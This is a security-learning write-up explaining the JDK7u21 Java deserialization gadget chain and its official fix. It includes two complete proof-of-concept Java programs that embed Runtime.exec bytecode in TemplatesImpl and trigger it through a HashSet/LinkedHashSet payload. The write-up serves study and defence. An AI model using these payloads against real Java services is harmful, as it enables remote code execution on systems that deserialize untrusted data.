# Java Security Learning—JDK7u21 Chain

Author: H3rmesk1t

Data: 2022.03.10

# Preface
In the deserialization of `java`, there is a classic vulnerability. In the absence of a third-party library with deserialization vulnerability, it can be used to exploit the deserialization vulnerability, that is, the exploit chain that exists in the `jdk` version `7u21` and previous versions. The deserialization vulnerability can be used to utilize the native code of `jdk`.

# Pre-knowledge
The knowledge points involved in this deserialization vulnerability have been mentioned in the previous `Commons-Collections` chain, and only a simple description is given here.
## TemplatesImpl
First follow up on the `getTransletInstance` method. When `_class==null`, the `defineTransletClasses` method will be called. Then, the `_class[_transletIndex]` method of `_class[_transletIndex].newInstance` statement is used to call the parameterless constructor method of `_class[_transletIndex]` to generate the class instance object. It should be noted here that the `getTransletInstance` method is also called in the `newTransformer` method and does not require a precondition to be called, so calling the `newTransformer` or `getTransletInstance` method is OK.

<div align=center><img src="./images/1.png"></div>

<div align=center><img src="./images/2.png"></div>

Then follow up on the `defineTransletClasses` method, traverse the `_bytecodes(byte[][])` array, and use the class loader to convert the bytecode into `Class`.

<div align=center><img src="./images/3.png"></div>

## AnnotationInvocationHandler
Through analysis of the `TemplatesImpl` class, we need to find a serialized class to call the `newTransformer` or `getTransletInstance` method of the `TemplatesImpl` object. The `equalsImpl` method in the `AnnotationInvocationHandler` class is exactly in line with it.

<div align=center><img src="./images/4.png"></div>

There is a `var8 = var5.invoke(var1);` statement in `AnnotationInvocationHandler#equalsImpl`, and the `var5` method of the `var1` object can be called through reflection. When the `equalsImpl` method is called and you want to successfully execute to `var5.invoke(var1)`, the following conditions need to be met:
 - var1! = this;
 - The var1 object can be converted to this.type type, this.type should be the current class or parent class of the corresponding class of var1;
 - this.asOneOfUs(var1) returns null.

According to the above analysis, to execute the method of the `TemplatesImpl` object through reflection, `var1` should be the `TemplatesImpl` object, `var5` should be the method in the `TemplatesImpl` class, and the `var5` method is obtained from the `this.type` class. By looking at the `TemplatesImpl` class, the `javax.xml.transform.Templates` interface just matches, and the `getOutputProperties` method will eventually be called here.

<div align=center><img src="./images/5.png"></div>

The `equalsImpl` method is called in `AnnotationInvocationHandler#invoke` and needs to be met:
 - var2 method name should be equals;
 - The number of formal parameters of the var2 method is 1;
 - The formal parameter type of the var2 method is Object type.

<div align=center><img src="./images/6.png"></div>

## HashMap
As I learned above, I need to find a method that calls the equals method on `proxy` during deserialization. A common scenario is the set `set`. Due to the uniqueness of the set, the objects stored in `set` are not allowed to be repeated, which involves comparison operations.

Follow up on the `HashSet` method, there will be a `map.put(e, PRESENT);` operation in its `readObject` method.

<div align=center><img src="./images/7.png"></div>

Follow up to the `HashMap#put` method and perform the `key.equals(k)` operation. If the `key` is a `templates` object and `k` is a `templatesImpl` object, the previous logic can be triggered.

<div align=center><img src="./images/8.png"></div>

Analyze the prerequisites for executing `key.equals(k)` operation:
 - HashMap saves the hash values ​​of two keys equal, and indexFor calculates i equal;
 - The key value of the previous HashMap object value is not equal to the key value stored now;
 - The key value stored now is the templates object, and the previous stored key value is the templatesImpl object.

Follow up on the `HashMap#hash` method, the `hashCode` method passed in `k` is actually called. So the `hashCode` method of the `templatesImpl` and `templates` objects are actually called.

<div align=center><img src="./images/9.png"></div>

The `TemplatesImpl` class does not override the `hashCode` method, and calls the default `hashCode` method. The proxy class corresponding to the `templates` object override the `hashCode` method and actually calls the `hashCodeImpl` method of the `AnnotationInvocationHandler` class. Follow up on the `AnnotationInvocationHandler#hashCodeImple` method, which will traverse `this.memberValues`, and then calculate `var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())`.

A very clever method is used in `JDK7u21`:
- When there is only one key and one value in memberValues, the hash is simplified to (127 * key.hashCode()) ^ value.hashCode();
- When key.hashCode() is equal to 0, the result of any number XOR 0 is still itself, so the hash is simplified to value.hashCode();
- When value is a TemplateImpl object, the hashes of these two objects are exactly equal.

```java
private int hashCodeImpl() {
    int var1 = 0;

    Entry var3;
    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
        var3 = (Entry)var2.next();
    }

    return var1;
}
```

Therefore, the final problem now is to find a string whose `hashCode` is `0`, and a calculation method is given here, and one of the answers is `f5a5a608`.

```java
for (long i = 0; i < 99999999999L; i++) {
    if (Long.toHexString(i).hashCode() == 0) {
        System.out.println(Long.toHexString(i));
    }
}
```

## LinkedHashSet
Since the call chain is triggered through deserialization, you need to find out whether there is a `put` method that calls `map` in the `readObject` deserialization method. In the `readObject` deserialization method of `HashSet`, the `put` value in the `map` object will be looped. When creating the `LinkedHashSet` object, first write the `templatesImpl` object, and then write the `templates` object. Then call writeObject` to write to the `LinkedHashSet` object. Use `LinkedHashSet` to add values ​​to ensure the order of joining values.

<div align=center><img src="./images/10.png"></div>

# JDK7u21 call chain
The call chain of `JDK7u21` chain in `ysoserial` is as follows:

```java
LinkedHashSet.readObject()
  LinkedH
ashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
```

# POC
 - POC1

```java
package org.h3rmesk1t.JDK7u21;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/10 8:16 pm
 */
public class ExploitOfJDK7u21 {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static TemplatesImpl generateEvilTemplates() throws Exception {

        // Generate malicious bytecodes
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractMethodError.class));
        CtClass ctClass = pool.makeClass("JDK7u21Exploit");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        // Instantiate the class and set properties
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_name", "h3rmesk1t");
        setFieldValue(templatesImpl, "_bytecodes", targetByteCodes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        return templatesImpl;
    }

    public static void exp() throws Exception {

        TemplatesImpl templates = generateEvilTemplates();
        HashMap hashMap = new HashMap();
        hashMap.put("f5a5a608", "zero");

        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, hashMap);

        // Create a layer of proxy for tempHandler
        Templates proxy = (Templates) Proxy.newProxyInstance(ExploitOfJDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
        // Instantiate the HashSet and put two objects in it
        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        // Set malicious templates into map
        hashMap.put("f5a5a608", te
mplates);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object object = (Object)ois.readObject();
        System.out.println(object);
        ois.close();
    }

    public static void main(String[] args) {
        try {
            exp();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

 - POC2

```java
package org.h3rmesk1t.JDK7u21;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/10 8:16 pm
 */
public class Poc {
    //Serialization
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    //Deserialization
    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }

    // Assign values ​​to obj's attributes through reflection
    private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    //Encapsulated the previous construction of the malicious TemplatesImpl class
    private static TemplatesImpl getEvilTemplatesImpl() throws Exception {
        ClassPool pool = ClassPool.getDefault();//ClassPool object is a container representing the CtClass object of the class file
        CtClass cc = pool.makeClass("Evil");//Create Evil class
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//Set the parent class of the Evil class to AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//Create a parameterless constructor
        cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//Set the parameterless constructor body
        cc.addConstructor(cons);
        byte[] byteCode = cc.toBytecode();//toBytecode gets the bytecode of the Evil class
        byte[][] targetByteCode = new byte[][]{byteCode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCode);
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "xx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    public static void main(String[] args) throws Exception {
        expHashSet();
// expLinkedHashSet();
    }

    public static void expLinkedHashSet() throws Exception {
        TemplatesImpl templates = getEvilTemplatesImpl();

        HashMap map = new HashMap();

        //Create the handler used by the proxy through reflection, and AnnotationInvocationHandler serves as the handler of the dynamic proxy
        Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);

        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);

        // Create a dynamic proxy, use tempHandler to proxy the Templates interface, and AnnotationInvocationHandler's invoke proxy the Templates interface two methods newTransformer() and getOutputProperties()
        Templates proxy = (Templates) Proxy.newProxyInstance(Poc.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);
        map.put("f5a5a608", templates);

        byte[] obj = serialize(set);
        unserialize(obj);
    }


    public static void expHashSet() throws Exception {
        TemplatesImpl templates = getEvilTemp
latesImpl();

        HashMap map = new HashMap();
        map.put("f5a5a608", new int[]{-16});

        //Create the handler used by the proxy through reflection, and AnnotationInvocationHandler serves as the handler of the dynamic proxy
        Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);

        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);

        // Create a dynamic proxy, use tempHandler to proxy the Templates interface, and AnnotationInvocationHandler's invoke proxy the Templates interface two methods newTransformer() and getOutputProperties()
        Templates proxy = (Templates) Proxy.newProxyInstance(Poc.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        HashSet set = new HashSet();
        set.add(proxy);
        set.add(templates);
        map.put("f5a5a608", templates);

        byte[] obj = serialize(set);
        unserialize(obj);
    }
}
```

# Fixed
Official fix: In the readObject function of the `sun.reflect.annotation.AnnotationInvocationHandler` class, there was originally a check for `this.type`, which would throw an exception if it was not `AnnotationType`. However, after catching the exception, nothing was done, and the function was returned, which did not affect the entire deserialization execution process. In the new version, changing this return to throwing an exception will cause the entire serialization process to terminate. However, there are still problems with this fix, which also leads to another native utilization chain `JDK8u20`.

<div align=center><img src="./images/11.png"></div>